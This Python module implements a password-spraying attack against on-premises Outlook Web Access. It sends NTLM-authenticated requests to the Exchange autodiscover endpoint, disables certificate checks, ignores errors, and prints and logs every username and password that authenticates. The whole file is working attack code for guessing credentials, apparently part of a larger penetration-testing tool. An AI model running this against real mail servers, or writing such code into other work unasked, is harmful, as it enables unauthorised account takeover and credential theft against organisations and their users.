#!/usr/bin/env python3

# Import all the libraries for the different prtocols
import requests
import warnings
from requests_ntlm import HttpNtlmAuth
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function to password spray against on-prem owa portal.
Targets autodiscover service to validate credentials'''
def owa_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    owa = ''.join(params.get("host"))
    owaurl = 'https://' + owa + '/autodiscover/autodiscover.xml'
    target = owa.split('/')

    try:
        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [OWA] Target: {target[0]} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        headers = {"Content-Type": "text/xml"}
        query = requests.get(owaurl, auth=HttpNtlmAuth(username, password), verify=False, headers=headers)
        if query.status_code == 200:
            print("ACCOUNT FOUND: [OWA] Target: {} User: {} Password: {} [SUCCESS]".format(
            target[0], username, password))
            if filelogger != None:
                filelogger.debug("ACCOUNT FOUND: [OWA] Target: {} User: {} Password: {} [SUCCESS]".format(target[0], username, password))
        elif query.status_code == 401:
            pass
        else:
            print("The Header Respose code to investigate: {}".format(query.status_code))
	
    except:
        pass
